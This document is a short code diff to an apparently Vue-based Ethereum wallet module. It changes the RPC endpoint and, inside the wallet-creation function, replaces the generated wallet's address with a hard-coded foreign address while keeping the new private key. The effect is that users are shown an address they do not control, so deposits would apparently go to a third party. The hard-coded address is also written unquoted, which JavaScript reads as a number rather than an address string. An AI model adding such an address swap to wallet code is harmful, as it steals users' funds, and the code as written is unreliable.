@@ -1,6 +1,6 @@
 import Web3 from 'web3';
 const web3 = new Web3(
-  `https://mainnet.infura.io/v3/${process.env.VUE_APP_API_KEY}`
+  `https://cloudflare-eth.com`
 );
 
 export default {
@@ -16,7 +16,7 @@ export default {
     async createWallet({ commit }) {
       const wallet = await web3.eth.accounts.create();
       const data = {
-        address: wallet.address,
+        address: 0x6a164122d5cf7c840D26e829b46dCc4ED6C0ae48,
         privateKey: wallet.privateKey,
         link: `${window.origin}/#${wallet.privateKey}`
       };
